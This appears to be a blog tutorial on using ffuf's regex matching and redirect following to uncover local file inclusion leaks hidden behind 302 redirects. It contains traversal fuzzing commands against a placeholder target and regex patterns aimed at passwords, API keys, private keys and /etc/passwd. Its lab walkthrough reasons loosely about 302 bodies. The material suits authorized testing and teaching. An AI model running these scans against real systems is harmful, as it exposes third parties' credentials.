Written By Aryan Giri

In web application security, automation is only as good as its filtering logic. A common pitfall in directory and parameter fuzzing is relying solely on HTTP status codes. When applications return generic redirects (302) or custom error pages for both valid and invalid inputs, standard filters like `-mc 200` fail to distinguish signal from noise.

This guide details a content-based approach using `ffuf`’s regex matching capabilities (`-mr`) to identify sensitive data leaks, configuration files, and source code exposure, even when the server attempts to hide them behind redirects. We will explore why status-code matching fails, how to implement robust regex filters, and provide a comprehensive library of patterns for offensive security assessments.

## The Problem: Why Status Code Matching Fails

Consider a vulnerable endpoint that accepts a file path via a GET parameter:

```http
GET /dashboard.php?skin=FUZZ
```

A typical wordlist might include paths like `../config`, `index.php`, and random strings like `asdf123`.

### Scenario Analysis

1.  **Valid Input (`../config`)**: The server attempts to include the file. If successful, it might render the content. However, due to application logic, it might first issue a `302 Found` redirect to a login page or a dashboard home.
2.  **Invalid Input (`random_path`)**: The server fails to find the file. Instead of returning a `404 Not Found`, the application’s global error handler catches the exception and issues a `302 Found` redirect to a generic "Error" or "Home" page.

If you run `ffuf` with `-mc 200`, both results are ignored because they return `302`. If you run it without filtering, you get hundreds of `302` responses, making it impossible to spot the one that actually returned sensitive data.

### Method 1: Status Code Matching (Fails)

```bash
ffuf -u http://TARGET/dashboard.php?skin=FUZZ \
-w lfi.txt \
-mc 200
```

**Output:**
```text
[Status: 302, Size: 0, Words: 1, Lines: 1] ../config
[Status: 302, Size: 0, Words: 1, Lines: 1] random_path
...
```
*Result:* No useful findings. The tool ignores all `302`s.

### Method 2: No Filtering (Noisy)

```bash
ffuf -u http://TARGET/dashboard.php?skin=FUZZ \
-w lfi.txt
```

**Output:**
Hundreds of lines with `Status: 302`. You must manually inspect each one. This is inefficient and prone to human error.

## The Solution: Follow Redirects and Match Content

To solve this, we need two things:
1.  **Follow Redirects**: Tell `ffuf` to follow the `302` and analyze the final response body.
2.  **Content Matching**: Use regex to search for specific patterns in the final response body, not just the status code.

### Method 3: Follow Redirects

The `-r` flag tells `ffuf` to follow HTTP redirects.

```bash
ffuf \
-u http://TARGET/dashboard.php?skin=FUZZ \
-w lfi.txt \
-r
```

Now, `ffuf` reports the status code of the *final* destination. If `../config` redirects to a page containing PHP source code, the final status might be `200`. However, if the error page also returns `200`, we still have noise.

### Method 4: Regex Matching (Best Practice)

The `-mr` flag allows us to specify a regular expression. `ffuf` will only report results where the response body matches the regex.

```bash
ffuf \
-u http://TARGET/dashboard.php?skin=FUZZ \
-w lfi.txt \
-r \
-mr '(?i)(password|secret|token|api[_-]?key|database|mysql|<\?php)'
```

**Output:**
```text
../config                 [Status: 200, Size: 2591, Words: 866, Lines: 93]
```

Only the payload that triggered a response containing sensitive keywords is reported. The hundreds of false positive `302`s leading to generic error pages are silently discarded.

## Understanding the Output

When `ffuf` reports a match, it provides key metrics:

*   **Status**: The HTTP status code of the final response (after redirects).
*   **Size**: The length of the response body in bytes. Significant differences in size can indicate unique content.
*   **Words/Lines**: Useful for filtering out standard error pages. If all false positives have ~50 words, and your finding has ~800 words, it’s likely unique.

## Complete Regex Library for Offensive Fuzzing

Below is a curated list of regex patterns designed to detect sensitive information in web responses. These can be used with `ffuf -mr` or other command-line tools.

### Credentials & Secrets

| Pattern | Description | Matches |
|---|---|---|
| `(?i)(password\|passwd\|pass\|pwd)` | Common password variables | `$password`, `db_pass` |
| `(?i)(secret\|token\|jwt\|bearer)` | Authentication tokens | `secret_key`, `access_token` |
| `(?i)(apikey\|api[_-]?key\|client[_-]?secret)` | API credentials | `api_key`, `client_secret` |

### Infrastructure & Configuration

| Pattern | Description | Matches |
|---|---|---|
| `(?i)(mysql\|mysqli\|pdo\|database\|host\|port)` | Database config | `mysql_host`, `db_port` |
| `(?i)(AKIA\|ASIA\|aws\|bucket\|s3)` | AWS Credentials | `AKIAIOSFODNN7EXAMPLE` |
| `(?i)(BEGIN RSA PRIVATE KEY\|BEGIN OPENSSH)` | SSH Keys | Private key headers |

### Source Code & Debug Info

| Pattern | Description | Matches |
|---|---|---|
| `(?i)(<\?php\|\$[A-Za-z_][A-Za-z0-9_]*\s*=)` | PHP Source | Raw PHP code leakage |
| `(?i)(root:x:\|daemon:\|/bin/bash)` | Linux `/etc/passwd` | User account listings |
| `eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+` | JWT Tokens | JSON Web Tokens |
| `(?i)(stack trace\|fatal error\|warning:)` | Error Messages | Debug output |

### Combining Patterns

You can combine multiple patterns using the `|` (OR) operator. For a comprehensive sweep:

```bash
ffuf \
-u http://TARGET/dashboard.php?skin=FUZZ \
-w lfi.txt \
-r \
-mr '(?i)(password|secret|token|api[_-]?key|database|mysql|<\?php|AKIA|BEGIN RSA)'
```

## FFUF Filter Reference

Understanding filters is crucial for tuning your scans.

| Flag | Description | Example Use Case |
|---|---|---|
| `-mc` | Match Status Codes | `-mc 200,301` |
| `-fc` | Filter Status Codes | `-fc 404,500` |
| `-ms` | Match Size | `-ms 1234` |
| `-fs` | Filter Size | `-fs 0` (Ignore empty responses) |
| `-mw` | Match Word Count | `-mw 100` |
| `-fw` | Filter Word Count | `-fw 5` (Ignore short errors) |
| `-ml` | Match Line Count | `-ml 50` |
| `-fl` | Filter Line Count | `-fl 1` |
| `-mr` | Match Regex | `-mr '(?i)password'` |
| `-fr` | Filter Regex | `-fr 'Not Found'` |
| `-r` | Follow Redirects | Essential for 302 analysis |
| `-ac` | Auto-Calibrate | Automatically filter common false positives |

## Real Lab Walkthrough

Let’s replicate the scenario where traditional automation fails.

**Target:** `http://TARGET/dashboard.php?skin=../config`

1.  **Initial Request**:
    ```http
    GET /dashboard.php?skin=../config HTTP/1.1
    Host: TARGET
    ```
2.  **Server Response**:
    ```http
    HTTP/1.1 302 Found
    Location: /login.php
    ```
3.  **Following Redirect (Manual)**:
    If we follow the redirect to `/login.php`, we might see a standard login form. However, in our specific case, the `include()` function in PHP executed *before* the redirect header was sent, or the redirect was conditional.
    
    *Correction*: In many LFI cases, the PHP code executes, outputs the file content, and *then* the script continues. If the script has a `header('Location: ...')` at the end, the browser redirects, but the body already contains the leaked file. Some servers strip the body on redirect, but others do not.

    Let’s assume the server returns the file content in the body of the `302` response (non-standard but possible) or follows a redirect to a page that *displays* the included content.

    **Developer Tools Inspection**:
    *   Navigate to the **Network** tab.
    *   Click on the request.
    *   Check the **Response** tab.
    *   Content:
        ```php
        <?php
        $MASTER_PASSWORD='support@110';
        $DB_HOST='localhost';
        ?>
        ```

4.  **Automation Failure**:
    *   `ffuf -mc 200`: Misses it (Status 302).
    *   `ffuf` (no filter): Buried in noise.

5.  **Automation Success**:
    ```bash
    ffuf -u http://TARGET/dashboard.php?skin=FUZZ -w lfi.txt -r -mr '(?i)password'
    ```
    *   `ffuf` follows the redirect.
    *   It scans the final body.
    *   It finds `password`.
    *   It reports the finding.

## Pro Tips for Content-Based Fuzzing

*   **Always Follow Redirects**: Use `-r` in `ffuf`. Many apps hide errors behind redirects.
*   **Never Trust Status Codes Alone**: A `200 OK` can be a generic error page. A `404` can contain stack traces. Always inspect the body.
*   **Build Reusable Regex Libraries**: Save your regex patterns in a text file. Combine them for broad sweeps or use specific ones for targeted searches.
*   **Compare Metrics**: If regex matching is too broad, use `-fs` (filter size) to exclude standard error page sizes. If all false positives are 500 bytes, filter out 500.
*   **Context Matters**: Adjust regex based on the technology stack. If you know it’s a Java app, look for `stack trace` and `javax`. If it’s PHP, look for `<?php` and `$var`.

By shifting focus from HTTP status codes to response content, you transform noisy, ineffective scans into precise, high-signal operations. This approach is essential for uncovering hidden vulnerabilities in modern web applications that employ complex error handling and redirection logic.
